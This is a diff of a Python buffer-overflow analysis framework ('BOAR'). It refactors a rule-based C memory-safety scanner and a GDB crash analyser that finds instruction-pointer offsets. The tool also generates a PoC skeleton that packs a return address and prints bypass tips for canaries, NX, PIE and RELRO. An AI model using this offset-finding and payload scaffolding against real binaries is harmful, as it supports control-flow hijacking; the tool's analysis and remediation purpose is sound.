@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 BOAR - Buffer Overflow Analysis & Remediation Framework
-Enhanced version with CVE-based detection and advanced exploit generation
+Rule-driven memory-safety scanner with optional GDB crash analysis
 """
 
 import re
@@ -12,7 +12,17 @@ import subprocess
 import struct
 import json
 import time
-from datetime import datetime
+from pathlib import Path
+from boar_engine import (
+    analyze_path,
+    analyze_source,
+    build_report,
+    build_sarif,
+    filter_by_severity,
+    load_rules,
+    reaches_threshold,
+    render_text,
+)
 
 def print_dragon_banner():
     """Print epic dragon breathing BOAR fire banner - inspired by dark fantasy artwork"""
@@ -43,8 +53,8 @@ def print_dragon_banner():
 {BOLD}{WHITE}                             ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝{RESET}
 
 {BOLD}{CYAN}                        BOAR - Buffer Overflow Analysis & Remediation Framework{RESET}
-{BOLD}{YELLOW}                            CVE-Based Detection Engine{RESET}
-{BOLD}{MAGENTA}                            Advanced Exploit Generation{RESET}
+{BOLD}{YELLOW}                            Rule-Based Detection Engine{RESET}
+{BOLD}{MAGENTA}                            PoC Skeleton Generation{RESET}
 {BOLD}{GREEN}                            Dynamic Crash Analysis{RESET}
 
 {BOLD}{BLUE}     ╔══════════════════════════════════════════════════════════════════════════════════════╗{RESET}
@@ -52,306 +62,115 @@ def print_dragon_banner():
 {BOLD}{BLUE}     ╚══════════════════════════════════════════════════════════════════════════════════════╝{RESET}
 """
 
-    print(epic_dragon)
+    print(epic_dragon, file=sys.stderr)
     
-    # Add a small delay for dramatic effect
-    time.sleep(0.5)
+    # Only pause on interactive terminals so CI and piped runs have zero delay
+    if sys.stderr.isatty():
+        time.sleep(0.15)
     
     # Print additional info
-    print(f"{BOLD}{WHITE}     🔥 Powered by Real-World CVE Patterns | 🎯 Advanced Exploit Templates | 🛡️ Protection Bypass Techniques{RESET}")
-    print(f"{BOLD}{CYAN}     ═══════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
-    print()
+    print(f"{BOLD}{WHITE}     🔥 14 Memory-Safety Rules | Scoped Buffer Tracking | SARIF & CI-Ready{RESET}", file=sys.stderr)
+    print(f"{BOLD}{CYAN}     ═══════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}", file=sys.stderr)
+    print(file=sys.stderr)
 
 ## =================================================================
-## BAGIAN 1: MODUL ANALISIS STATIS DENGAN CVE-BASED DETECTION
+## BAGIAN 1: MODUL ANALISIS STATIS BERBASIS RULE
 ## =================================================================
 
-# CVE-based vulnerability patterns dengan referensi CVE nyata
-CVE_PATTERNS = {
-    'gets': {
-        'severity': 'CRITICAL',
-        'cve_refs': ['CVE-2012-3489', 'CVE-2015-1781', 'CVE-2016-4051'],
-        'description': 'Fungsi gets() tidak melakukan bound checking, sangat mudah di-overflow',
-        'remediation': 'Gunakan fgets() dengan buffer size yang tepat',
-        'pattern': r'\bgets\s*\(',
-        'example_exploit': 'payload = "A" * 1024 + return_address'
-    },
-    'strcpy': {
-        'severity': 'HIGH',
-        'cve_refs': ['CVE-2005-1544', 'CVE-2017-14107', 'CVE-2019-9169'],
-        'description': 'strcpy() tidak memeriksa ukuran buffer destination',
-        'remediation': 'Gunakan strncpy() atau strlcpy() dengan size limit',
-        'pattern': r'\bstrcpy\s*\(',
-        'example_exploit': 'strcpy(buffer, long_string) -> buffer overflow'
-    },
-    'strcat': {
-        'severity': 'HIGH',
-        'cve_refs': ['CVE-2006-1168', 'CVE-2012-2372', 'CVE-2018-16529'],
-        'description': 'strcat() tidak memeriksa ukuran buffer destination',
-        'remediation': 'Gunakan strncat() dengan size calculation yang benar',
-        'pattern': r'\bstrcat\s*\(',
-        'example_exploit': 'strcat(buffer, input) -> heap/stack overflow'
-    },
-    'sprintf': {
-        'severity': 'HIGH',
-        'cve_refs': ['CVE-2005-0202', 'CVE-2017-9047', 'CVE-2020-12767'],
-        'description': 'sprintf() dapat menyebabkan buffer overflow dengan format string',
-        'remediation': 'Gunakan snprintf() dengan buffer size limit',
-        'pattern': r'\bsprintf\s*\(',
-        'example_exploit': 'sprintf(buf, "%s", long_input) -> overflow'
-    },
-    'scanf': {
-        'severity': 'MEDIUM',
-        'cve_refs': ['CVE-2012-3489', 'CVE-2015-1781'],
-        'description': 'scanf() dengan %s tanpa width specifier dapat overflow',
-        'remediation': 'Gunakan scanf("%99s", buffer) atau fgets()',
-        'pattern': r'\bscanf\s*\([^)]*%s[^)]*\)',
-        'example_exploit': 'scanf("%s", buffer) + long input -> overflow'
-    },
-    'memcpy': {
-        'severity': 'MEDIUM',
-        'cve_refs': ['CVE-2016-1238', 'CVE-2019-11477'],
-        'description': 'memcpy() tanpa bound checking dapat menyebabkan overflow',
-        'remediation': 'Validasi size parameter dan gunakan safe alternatives',
-        'pattern': r'\bmemcpy\s*\([^,]+,\s*[^,]+,\s*[^)]*\)',
-        'example_exploit': 'memcpy(dst, src, user_controlled_size) -> overflow'
-    },
-    'vsprintf': {
-        'severity': 'HIGH',
-        'cve_refs': ['CVE-2005-0202', 'CVE-2017-9047'],
-        'description': 'vsprintf() rentan terhadap format string dan buffer overflow',
-        'remediation': 'Gunakan vsnprintf() dengan buffer size limit',
-        'pattern': r'\bvsprintf\s*\(',
-        'example_exploit': 'vsprintf(buffer, format, args) -> overflow'
-    },
-    'alloca': {
-        'severity': 'HIGH',
-        'cve_refs': ['CVE-2016-3706', 'CVE-2017-1000366'],
-        'description': 'alloca() dengan user input dapat menyebabkan stack overflow',
-        'remediation': 'Gunakan malloc() dengan size validation',
-        'pattern': r'\balloca\s*\(',
-        'example_exploit': 'alloca(user_size) -> stack exhaustion'
-    }
-}
+# Static analysis is rule-driven; rules live in boar_rules.json. Keeping the
+# engine in a separate module lets the rule set and matcher tests evolve without
+# touching the CLI or the dynamic-analysis code.
 
-# Pattern untuk deteksi kerentanan kompleks
-COMPLEX_VULNERABILITY_PATTERNS = {
-    'format_string': {
-        'severity': 'HIGH',
-        'cve_refs': ['CVE-2000-0573', 'CVE-2005-1125'],
-        'description': 'Format string vulnerability - user input sebagai format string',
-        'pattern': r'printf\s*\(\s*[^"]*\s*\)|fprintf\s*\([^,]+,\s*[^"]*\)',
-        'remediation': 'Gunakan printf("%s", user_input) bukan printf(user_input)'
-    },
-    'integer_overflow': {
-        'severity': 'MEDIUM',
-        'cve_refs': ['CVE-2016-5195', 'CVE-2017-7308'],
-        'description': 'Potential integer overflow dalam size calculation',
-        'pattern': r'malloc\s*\([^)]*\*[^)]*\)|calloc\s*\([^)]*\*[^)]*\)',
-        'remediation': 'Validasi integer overflow sebelum operasi aritmatika'
-    },
-    'double_free': {
-        'severity': 'HIGH',
-        'cve_refs': ['CVE-2016-4051', 'CVE-2017-9233'],
-        'description': 'Potential double free vulnerability',
-        'pattern': r'free\s*\([^)]+\)',
-        'remediation': 'Set pointer ke NULL setelah free(), gunakan static analysis'
-    },
-    'use_after_free': {
-        'severity': 'CRITICAL',
-        'cve_refs': ['CVE-2017-8890', 'CVE-2018-8897'],
-        'description': 'Potential use-after-free vulnerability',
-        'pattern': r'free\s*\([^)]+\).*\n.*\1',
-        'remediation': 'Hindari penggunaan pointer setelah free()'
-    }
-}
 
-def analyze_file(filepath):
-    """Menganalisis satu file kode untuk mencari fungsi-fungsi berbahaya berdasarkan CVE patterns."""
-    findings = []
+def analyze_file(filepath, rules=None):
+    """Analyze one file with the rule engine (kept as a public helper)."""
+    rules = rules or load_rules()
+    source = Path(filepath).read_text(encoding="utf-8", errors="ignore")
+    return analyze_source(source, os.path.basename(filepath), rules)
+
+
+def run_static_analysis(target_path, rules=None, severity="all", output_format="text", report_path=None):
+    """Run the rule engine, print the requested format, and return the report."""
+    rules = rules or load_rules()
+    print(f"[*] Memulai analisis statis pada: {target_path}", file=sys.stderr)
+    print(f"[*] Menggunakan {len(rules)} memory-safety rules", file=sys.stderr)
+
     try:
-        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-            lines = content.split('\n')
-            
-            # Analisis CVE-based patterns
-            for pattern_name, pattern_info in CVE_PATTERNS.items():
-                matches = re.finditer(pattern_info['pattern'], content, re.IGNORECASE | re.MULTILINE)
-                for match in matches:
-                    line_num = content.count('\n', 0, match.start()) + 1
-                    line_content = lines[line_num - 1].strip()
-                    
-                    # Skip jika dalam komentar
-                    if line_content.strip().startswith(('//', '/*', '*')):
-                        continue
-                    
-                    findings.append({
-                        'line_number': line_num,
-                        'function': pattern_name,
-                        'severity': pattern_info['severity'],
-                        'cve_refs': pattern_info['cve_refs'],
-                        'description': pattern_info['description'],
-                        'remediation': pattern_info['remediation'],
-                        'line_content': line_content,
-                        'file': os.path.basename(filepath),
-                        'example_exploit': pattern_info.get('example_exploit', 'N/A')
-                    })
-            
-            # Analisis complex vulnerability patterns
-            for vuln_type, vuln_info in COMPLEX_VULNERABILITY_PATTERNS.items():
-                matches = re.finditer(vuln_info['pattern'], content, re.IGNORECASE | re.MULTILINE)
-                for match in matches:
-                    line_num = content.count('\n', 0, match.start()) + 1
-                    line_content = lines[line_num - 1].strip()
-                    
-                    if line_content.strip().startswith(('//', '/*', '*')):
-                        continue
-                    
-                    findings.append({
-                        'line_number': line_num,
-                        'function': vuln_type,
-                        'severity': vuln_info['severity'],
-                        'cve_refs': vuln_info['cve_refs'],
-                        'description': vuln_info['description'],
-                        'remediation': vuln_info['remediation'],
-                        'line_content': line_content,
-                        'file': os.path.basename(filepath),
-                        'example_exploit': 'Complex pattern - requires manual analysis'
-                    })
-                    
-    except Exception as e:
-        print(f"[!] Gagal membaca atau memproses file '{filepath}': {e}")
-    return findings
+        findings = analyze_path(target_path, rules)
+    except FileNotFoundError as exc:
+        print(f"[!] Error: {exc}")
+        return None
 
-def generate_security_report(findings):
-    """Generate comprehensive security report dengan CVE references."""
-    if not findings:
-        return
-    
-    # Group findings by severity
-    severity_groups = {'CRITICAL': [], 'HIGH': [], 'MEDIUM': [], 'LOW': []}
-    for finding in findings:
-        severity = finding.get('severity', 'MEDIUM')
-        if severity in severity_groups:
-            severity_groups[severity].append(finding)
-    
-    # Generate report
-    report = {
-        'timestamp': datetime.now().isoformat(),
-        'total_vulnerabilities': len(findings),
-        'severity_breakdown': {k: len(v) for k, v in severity_groups.items()},
-        'detailed_findings': findings
-    }
-    
-    # Save JSON report
-    with open('security_report.json', 'w') as f:
-        json.dump(report, f, indent=2)
-    
-    print(f"\n[+] Laporan keamanan lengkap disimpan di: security_report.json")
+    findings = filter_by_severity(findings, severity)
+    report = build_report(target_path, findings, len(rules))
+    sarif_doc = (
+        build_sarif(target_path, findings, rules)
+        if (output_format == "sarif" or (report_path and str(report_path).lower().endswith(".sarif")))
+        else None
+    )
+
+    if report_path:
+        if str(report_path).lower().endswith(".sarif") or output_format == "sarif":
+            payload = sarif_doc or build_sarif(target_path, findings, rules)
+            Path(report_path).write_text(json.dumps(payload, indent=2), encoding="utf-8")
+            print(f"[+] SARIF report ditulis ke: {report_path}", file=sys.stderr)
+        else:
+            Path(report_path).write_text(json.dumps(report, indent=2), encoding="utf-8")
+            print(f"[+] JSON report ditulis ke: {report_path}", file=sys.stderr)
+
+    if output_format == "json":
+        print(json.dumps(report, indent=2))
+    elif output_format == "sarif":
+        print(json.dumps(sarif_doc, indent=2))
+    elif output_format == "jsonl":
+        for finding in findings:
+            print(json.dumps(finding))
+    else:
+        print(render_text(report))
     return report
 
-def run_static_analysis(target_path):
-    """Fungsi utama untuk menjalankan seluruh proses analisis statis dengan CVE-based detection."""
-    all_findings = []
-    print(f"[*] Memulai analisis statis CVE-based pada: {target_path}")
-    print(f"[*] Menggunakan {len(CVE_PATTERNS)} CVE patterns dan {len(COMPLEX_VULNERABILITY_PATTERNS)} complex patterns")
-    
-    if os.path.isfile(target_path):
-        all_findings.extend(analyze_file(target_path))
-    elif os.path.isdir(target_path):
-        for root, _, files in os.walk(target_path):
-            for file in files:
-                if file.endswith(('.c', '.cpp', '.h', '.cc', '.cxx')):
-                    filepath = os.path.join(root, file)
-                    print(f"[*] Menganalisis: {filepath}")
-                    all_findings.extend(analyze_file(filepath))
-    else:
-        print(f"[!] Error: Target '{target_path}' bukan file atau direktori yang valid.")
-        return
-
-    print("\n" + "="*80)
-    print(" LAPORAN ANALISIS KEAMANAN CVE-BASED")
-    print("="*80)
-    
-    if not all_findings:
-        print("\n[+] Tidak ditemukan pola kerentanan yang umum. Kode terlihat aman dari analisis statis.")
-        return
-    
-    # Generate comprehensive report
-    report = generate_security_report(all_findings)
-    
-    # Display findings by severity
-    severity_colors = {
-        'CRITICAL': '\033[91m',  # Red
-        'HIGH': '\033[93m',      # Yellow
-        'MEDIUM': '\033[94m',    # Blue
-        'LOW': '\033[92m'        # Green
-    }
-    reset_color = '\033[0m'
-    
-    print(f"\n[!] Ditemukan {len(all_findings)} potensi kerentanan:")
-    
-    for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
-        findings_by_severity = [f for f in all_findings if f.get('severity') == severity]
-        if findings_by_severity:
-            color = severity_colors.get(severity, '')
-            print(f"\n{color}{'='*20} {severity} SEVERITY ({len(findings_by_severity)} items) {'='*20}{reset_color}")
-            
-            for finding in findings_by_severity:
-                print(f"\n  📍 File: `{finding['file']}` | Line: {finding['line_number']}")
-                print(f"  🔍 Function/Pattern: `{finding['function']}`")
-                print(f"  📝 Description: {finding['description']}")
-                print(f"  🎯 CVE References: {', '.join(finding['cve_refs'])}")
-                print(f"  💡 Remediation: {finding['remediation']}")
-                print(f"  📋 Code: `{finding['line_content']}`")
-                print(f"  🚨 Example Exploit: {finding['example_exploit']}")
-                print("  " + "-"*70)
-    
-    # Summary statistics
-    print(f"\n{'='*80}")
-    print("RINGKASAN KEAMANAN:")
-    print(f"{'='*80}")
-    print(f"Total kerentanan ditemukan: {len(all_findings)}")
-    print(f"Critical: {len([f for f in all_findings if f.get('severity') == 'CRITICAL'])}")
-    print(f"High: {len([f for f in all_findings if f.get('severity') == 'HIGH'])}")
-    print(f"Medium: {len([f for f in all_findings if f.get('severity') == 'MEDIUM'])}")
-    print(f"Low: {len([f for f in all_findings if f.get('severity') == 'LOW'])}")
-    
-    # Recommendations
-    print(f"\n🔧 REKOMENDASI PRIORITAS:")
-    if any(f.get('severity') == 'CRITICAL' for f in all_findings):
-        print("1. SEGERA perbaiki semua kerentanan CRITICAL")
-    if any(f.get('severity') == 'HIGH' for f in all_findings):
-        print("2. Prioritaskan perbaikan kerentanan HIGH")
-    print("3. Lakukan code review menyeluruh")
-    print("4. Implementasikan secure coding practices")
-    print("5. Gunakan static analysis tools secara berkala")
-    
-    print("\n" + "="*80)
-
 ## =================================================================
-## BAGIAN 2: MODUL ANALISIS DINAMIS DENGAN ADVANCED CRASH DETECTION
+## BAGIAN 2: MODUL ANALISIS DINAMIS DAN CRASH DETECTION
 ## =================================================================
+
+def _de_bruijn_bytes(alphabet, order):
+    """Yield a prefix of a de Bruijn sequence over ``alphabet``."""
+    k = len(alphabet)
+    a = [0] * (k * order)
+
+    def generate(t, p):
+        if t > order:
+            if order % p == 0:
+                for index in range(1, p + 1):
+                    yield alphabet[a[index]]
+            return
+        a[t] = a[t - p]
+        for value in generate(t + 1, p):
+            yield value
+        for value in range(a[t - p] + 1, k):
+            a[t] = value
+            for item in generate(t + 1, t):
+                yield item
+
+    return generate(1, 1)
+
 
 def generate_pattern(length):
-    """Membuat string pola De Bruijn yang unik untuk melacak offset dengan presisi tinggi."""
-    pattern = b''
-    chars = b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
-    
-    # Generate cyclic pattern
-    for i in range(length):
-        pattern += chars[i % len(chars):i % len(chars) + 1]
-    
-    # Add unique markers setiap 4 bytes untuk arsitektur 32-bit
-    unique_pattern = b''
-    for i in range(0, length, 4):
-        chunk = pattern[i:i+4]
-        if len(chunk) == 4:
-            unique_pattern += chunk
-        else:
-            unique_pattern += chunk + b'X' * (4 - len(chunk))
-    
-    return unique_pattern[:length]
+    """Generate a de Bruijn pattern with unique 4-byte windows for offset search."""
+    if length <= 0:
+        return b""
+
+    alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+    order = 4
+    pattern = bytearray()
+    for byte in _de_bruijn_bytes(alphabet, order):
+        pattern.append(byte)
+        if len(pattern) == length:
+            break
+
+    # k**order is the maximum number of unique windows; repeating beyond that
+    # cannot preserve uniqueness, so return the largest unique prefix.
+    return bytes(pattern)
 
 def find_offset(hex_value, pattern):
     """Mencari offset dengan dukungan multiple architectures dan endianness."""
@@ -386,10 +205,14 @@ def find_offset(hex_value, pattern):
         except (struct.error, ValueError):
             pass
         
-        # Return the most likely interpretation (prefer little-endian, then 32-bit)
+        # Return the most likely interpretation. Wide values come from a 64-bit
+        # instruction pointer; narrow values normally come from a 32-bit one.
         if interpretations:
-            # Sort by preference: little-endian first, then 32-bit
-            interpretations.sort(key=lambda x: (x[2] != 'little-endian', x[1] != 32))
+            value = int(hex_value, 16)
+            preferred_bits = 64 if value > 0xFFFFFFFF else 32
+            interpretations.sort(key=lambda item: (
+                item[2] != 'little-endian', item[1] != preferred_bits,
+            ))
             return interpretations[0]
         
     except Exception as e:
@@ -397,7 +220,7 @@ def find_offset(hex_value, pattern):
     
     return None, None, None
 
-def analyze_crash_pattern(gdb_output):
+def analyze_crash_pattern(gdb_output, payload=None):
     """Menganalisis pola crash untuk memberikan insight yang lebih baik."""
     crash_info = {
         'crash_type': 'unknown',
@@ -407,15 +230,21 @@ def analyze_crash_pattern(gdb_output):
         'recommendations': []
     }
     
-    # Detect crash type
-    if "SIGSEGV" in gdb_output:
+    lower = gdb_output.lower()
+
+    # Specific allocator/stack diagnostics must win over the generic signal:
+    # glibc aborts on double free and heap corruption, so checking SIGABRT first
+    # would hide the actual memory-safety failure.
+    if "stack smashing" in lower:
+        crash_info['crash_type'] = 'stack_smashing'
+    elif "double free" in lower or "double-free" in lower:
+        crash_info['crash_type'] = 'double_free'
+    elif "corrupted" in lower and ("malloc" in lower or "free" in lower or "heap" in lower):
+        crash_info['crash_type'] = 'heap_corruption'
+    elif "SIGSEGV" in gdb_output:
         crash_info['crash_type'] = 'segmentation_fault'
     elif "SIGABRT" in gdb_output:
         crash_info['crash_type'] = 'abort_signal'
-    elif "double free" in gdb_output.lower():
-        crash_info['crash_type'] = 'double_free'
-    elif "stack smashing" in gdb_output.lower():
-        crash_info['crash_type'] = 'stack_smashing'
     
     # Extract register information
     reg_patterns = [
@@ -430,15 +259,49 @@ def analyze_crash_pattern(gdb_output):
         for match in matches:
             reg_name, reg_value = match.groups()
             crash_info['registers'][reg_name.upper()] = reg_value
-    
+
+    controlled = []
+    if payload:
+        for reg_name, reg_value in crash_info['registers'].items():
+            offset, _, _ = find_offset(reg_value, payload)
+            if offset is not None:
+                controlled.append((reg_name, offset))
+    crash_info['controlled_registers'] = controlled
+
     # Analyze exploitability
     if crash_info['crash_type'] == 'segmentation_fault':
-        if any(reg in crash_info['registers'] for reg in ['EIP', 'RIP']):
+        ip_reg = 'EIP' if 'EIP' in crash_info['registers'] else (
+            'RIP' if 'RIP' in crash_info['registers'] else None
+        )
+        ip_controlled = False
+        if payload and ip_reg:
+            ip_controlled = find_offset(crash_info['registers'][ip_reg], payload)[0] is not None
+
+        if payload is None:
+            ip_controlled = ip_reg is not None
+
+        if ip_controlled:
             crash_info['exploitability'] = 'high'
-            crash_info['recommendations'].append('Instruction pointer dapat dikontrol - kemungkinan besar exploitable')
+            crash_info['recommendations'].append(
+                'Instruction pointer berisi payload pattern - kemungkinan besar exploitable'
+            )
+        elif controlled:
+            crash_info['exploitability'] = 'high'
+            names = ', '.join('{}@{}'.format(name, offset) for name, offset in controlled)
+            crash_info['recommendations'].append(
+                'Register terkontrol: {} - stack overflow terkonfirmasi, IP belum terbukti'.format(names)
+            )
         else:
             crash_info['exploitability'] = 'medium'
-            crash_info['recommendations'].append('Crash terdeteksi tapi IP tidak terkontrol - perlu analisis lebih lanjut')
+            crash_info['recommendations'].append(
+                'Crash terdeteksi, tetapi tidak ada register yang cocok dengan payload pattern'
+            )
+    elif crash_info['crash_type'] == 'double_free':
+        crash_info['exploitability'] = 'high'
+        crash_info['recommendations'].append('Double free terdeteksi - audit jalur cleanup dan kepemilikan pointer')
+    elif crash_info['crash_type'] == 'heap_corruption':
+        crash_info['exploitability'] = 'high'
+        crash_info['recommendations'].append('Heap corruption terdeteksi - jalankan ulang dengan -fsanitize=address untuk lokasi pasti')
     
     # Stack analysis
     if "stack smashing" in gdb_output.lower():
@@ -453,42 +316,87 @@ def analyze_crash_pattern(gdb_output):
     
     return crash_info
 
+def active_protections(protections):
+    """Return protection names that are actually enabled."""
+    return [
+        name for name, value in protections.items()
+        if value not in (False, None, 'none', 'disabled')
+    ]
+
+
+def detect_system_aslr(proc_path="/proc/sys/kernel/randomize_va_space"):
+    """Read Linux kernel ASLR mode when available ('disabled', 'conservative', 'full', or None)."""
+    mapping = {
+        "0": "disabled",
+        "1": "conservative",
+        "2": "full",
+    }
+    try:
+        raw = Path(proc_path).read_text(encoding="utf-8").strip()
+    except OSError:
+        return None
+    return mapping.get(raw, raw or None)
+
+
+_FORTIFY_SYM_RE = re.compile(r"\b__(?!stack_chk_fail\b)[a-z0-9_]+_chk(?:@|\b)")
+
+
 def check_binary_protections(binary_path):
-    """Memeriksa proteksi keamanan yang aktif pada binary."""
+    """Inspect ELF metadata for canary, NX, PIE, RELRO, FORTIFY, plus host ASLR."""
     protections = {
         'canary': False,
         'nx': False,
         'pie': False,
-        'relro': False,
-        'aslr': False
+        'relro': 'none',
+        'fortify': False,
+        'aslr': detect_system_aslr(),
     }
-    
+
     try:
-        # Check with readelf if available
-        result = subprocess.run(['readelf', '-a', binary_path], 
-                              capture_output=True, text=True, timeout=10)
-        output = result.stdout + result.stderr
-        
-        # Analyze protections
-        if 'stack_chk_fail' in output:
-            protections['canary'] = True
-        if 'GNU_STACK' in output and 'RWE' not in output:
-            protections['nx'] = True
-        if 'DYN' in output:
+        header = subprocess.run(['readelf', '-hW', binary_path],
+                                capture_output=True, text=True, timeout=10)
+        segments = subprocess.run(['readelf', '-lW', binary_path],
+                                  capture_output=True, text=True, timeout=10)
+        dynamic = subprocess.run(['readelf', '-dW', binary_path],
+                                 capture_output=True, text=True, timeout=10)
+        symbols = subprocess.run(['readelf', '-sW', binary_path],
+                                 capture_output=True, text=True, timeout=10)
+
+        header_output = header.stdout + header.stderr
+        segment_output = segments.stdout + segments.stderr
+        dynamic_output = dynamic.stdout + dynamic.stderr
+        symbol_output = symbols.stdout + symbols.stderr
+
+        if 'Position-Independent Executable' in header_output:
             protections['pie'] = True
-        if 'GNU_RELRO' in output:
-            protections['relro'] = True
-            
-    except (subprocess.TimeoutExpired, FileNotFoundError):
-        # Fallback to basic file analysis
+        elif re.search(r'Type:\s+DYN', header_output):
+            protections['pie'] = True
+
+        for line in segment_output.splitlines():
+            if 'GNU_STACK' in line:
+                parts = line.split()
+                if len(parts) >= 2:
+                    protections['nx'] = 'E' not in parts[-2]
+                break
+
+        if 'GNU_RELRO' in segment_output:
+            protections['relro'] = 'full' if 'BIND_NOW' in dynamic_output else 'partial'
+
+        if '__stack_chk_fail' in symbol_output:
+            protections['canary'] = True
+
+        if _FORTIFY_SYM_RE.search(symbol_output):
+            protections['fortify'] = True
+
+    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
         try:
-            with open(binary_path, 'rb') as f:
-                content = f.read()
-                if b'stack_chk_fail' in content:
-                    protections['canary'] = True
-        except:
+            with open(binary_path, 'rb') as handle:
+                content = handle.read()
+            protections['canary'] = b'__stack_chk_fail' in content
+            protections['fortify'] = bool(re.search(rb'__(?!stack_chk_fail)[a-z0-9_]+_chk', content))
+        except OSError:
             pass
-    
+
     return protections
 
 def run_dynamic_analysis(binary_path, payload_length, debug=False, method='stdin'):
@@ -502,7 +410,7 @@ def run_dynamic_analysis(binary_path, payload_length, debug=False, method='stdin
     # Check binary protections
     print("[*] Memeriksa proteksi keamanan binary...")
     protections = check_binary_protections(binary_path)
-    print(f"[*] Proteksi aktif: {[k for k, v in protections.items() if v]}")
+    print(f"[*] Proteksi aktif: {active_protections(protections)}")
     
     # Generate payload
     payload = generate_pattern(payload_length)
@@ -546,7 +454,7 @@ def run_dynamic_analysis(binary_path, payload_length, debug=False, method='stdin
             print("="*70 + "\n")
 
         # Analyze crash
-        crash_info = analyze_crash_pattern(gdb_output)
+        crash_info = analyze_crash_pattern(gdb_output, payload)
         
         print(f"\n{'='*60}")
         print("HASIL ANALISIS CRASH")
@@ -558,6 +466,11 @@ def run_dynamic_analysis(binary_path, payload_length, debug=False, method='stdin
             print(f"\nRegister States:")
             for reg, value in crash_info['registers'].items():
                 print(f"  {reg}: {value}")
+
+        if crash_info.get('controlled_registers'):
+            print("\n[+] Register yang cocok dengan payload:")
+            for reg, offset in crash_info['controlled_registers']:
+                print(f"  {reg}: offset {offset}")
         
         if crash_info['crash_type'] == 'segmentation_fault':
             print("\n[!!!] CRASH TERDETEKSI! (Segmentation Fault)")
@@ -572,7 +485,7 @@ def run_dynamic_analysis(binary_path, payload_length, debug=False, method='stdin
                 ip_reg, ip_value = 'RIP', crash_info['registers']['RIP']
             
             if ip_reg and ip_value:
-                print(f"[+] Instruction Pointer ({ip_reg}) tertimpa dengan nilai: {ip_value}")
+                print(f"[+] Instruction Pointer ({ip_reg}) bernilai: {ip_value}")
                 
                 # Find offset
                 offset, arch, endian = find_offset(ip_value, payload)
@@ -601,8 +514,15 @@ def run_dynamic_analysis(binary_path, payload_length, debug=False, method='stdin
                         print(f"  # Tambahkan ROP chain setelah return address")
                     
                 else:
-                    print(f"[-] {ip_reg} tertimpa ({ip_value}) tetapi tidak ditemukan dalam payload pattern")
+                    print(f"[-] {ip_reg} = {ip_value} tidak cocok dengan payload pattern")
                     print(f"    Kemungkinan: transformasi data, encoding, atau indirect overwrite")
+                    for reg, controlled_offset in crash_info['controlled_registers']:
+                        print(f"[+] Register {reg} berisi payload pattern pada offset {controlled_offset}")
+                        if reg in ('RBP', 'EBP'):
+                            ptr_size = 8 if reg == 'RBP' else 4
+                            return_offset = controlled_offset + ptr_size
+                            print(f"[+] Saved frame pointer terkontrol; return address biasanya di offset {return_offset}")
+                            print(f"    Buat skrip PoC: python {sys.argv[0]} poc {binary_path} --offset {return_offset}")
             else:
                 print(f"[-] Crash terdeteksi tapi instruction pointer tidak terkontrol")
                 print(f"    Kemungkinan penyebab: stack canary, heap overflow, atau protection mechanism")
@@ -623,7 +543,7 @@ def run_dynamic_analysis(binary_path, payload_length, debug=False, method='stdin
                 print(f"  {i}. {rec}")
         
         # Print protection bypass advice
-        if any(protections.values()):
+        if active_protections(protections):
             print(f"\n[+] STRATEGI BYPASS PROTEKSI:")
             if protections['canary']:
                 print("  - Stack Canary: Cari format string bug atau information leak")
@@ -631,8 +551,9 @@ def run_dynamic_analysis(binary_path, payload_length, debug=False, method='stdin
                 print("  - NX/DEP: Gunakan ROP (Return Oriented Programming)")
             if protections['pie']:
                 print("  - PIE: Cari information leak untuk menentukan base address")
-            if protections['aslr']:
-                print("  - ASLR: Kombinasikan dengan PIE bypass atau heap spray")
+            if protections['relro'] != 'none':
+                print(f"  - RELRO ({protections['relro']}): overwrite GOT hanya jika RELRO tidak full")
+            print("  - ASLR: setting sistem-wide; cek /proc/sys/kernel/randomize_va_space")
 
     except subprocess.TimeoutExpired:
         print("[!] Timeout - proses GDB melebihi batas waktu")
@@ -665,18 +586,17 @@ def generate_advanced_poc_script(binary_path, offset, arch=32, protections=None)
     # Generate exploit template based on protections
     exploit_template = f"""#!/usr/bin/env python3
 \"\"\"
-Advanced Buffer Overflow Exploit Template
+BOAR PoC Skeleton
 Target: {binary_path}
 Offset: {offset}
 Architecture: {arch}-bit
-Protections: {[k for k, v in protections.items() if v]}
+Protections: {active_protections(protections)}
 Generated by BOAR (Buffer Overflow Analysis & Remediation)
 \"\"\"
 
 import subprocess
 import struct
 import sys
-import os
 
 # --- Configuration ---
 BINARY_PATH = "{binary_path}"
@@ -684,68 +604,25 @@ OFFSET = {offset}
 ARCH = {arch}
 PROTECTIONS = {protections}
 
+def active_protections():
+    return [name for name, value in PROTECTIONS.items() if value not in (False, None, 'none')]
+
 # --- Exploit Functions ---
 def p{arch}(addr):
     \"\"\"Pack address for {arch}-bit architecture\"\"\"
     return struct.pack("<{addr_format}", addr)
 
 def build_payload():
-    \"\"\"Build the exploit payload\"\"\"
+    \"\"\"Build the payload skeleton.\"\"\"
     payload = b'A' * OFFSET
-    
-    # === BASIC CONTROL FLOW HIJACKING ===
-    # Replace 0xdeadbeef with your target address
+
+    # Replace this placeholder with the address you want to execute.
+    # - NX enabled: put the first ROP gadget here (BOAR does not find gadgets).
+    # - NX disabled: point this at shellcode placed elsewhere in memory.
+    # - Stack canary: leak it first and insert it before the return address.
     target_address = {sample_addr}
     payload += p{arch}(target_address)
-    
-    # === ADVANCED EXPLOITATION TECHNIQUES ===
-    
-    {"# Stack Canary Protection Detected" if protections.get('canary') else "# No Stack Canary"}
-    {"# You'll need to leak the canary value first" if protections.get('canary') else ""}
-    {"# canary_value = leaked_canary" if protections.get('canary') else ""}
-    {"# payload = b'A' * (OFFSET - 8) + p64(canary_value) + b'A' * 8 + p64(target_address)" if protections.get('canary') and arch == 64 else ""}
-    
-    {"# NX/DEP Protection Detected - Use ROP" if protections.get('nx') else "# No NX/DEP - Shellcode execution possible"}
-    if protections.get('nx'):
-        payload += build_rop_chain()
-    else:
-        payload += build_shellcode()
-    
     return payload
-
-def build_rop_chain():
-    \"\"\"Build ROP chain for NX bypass\"\"\"
-    # TODO: Find ROP gadgets using ropper or ROPgadget
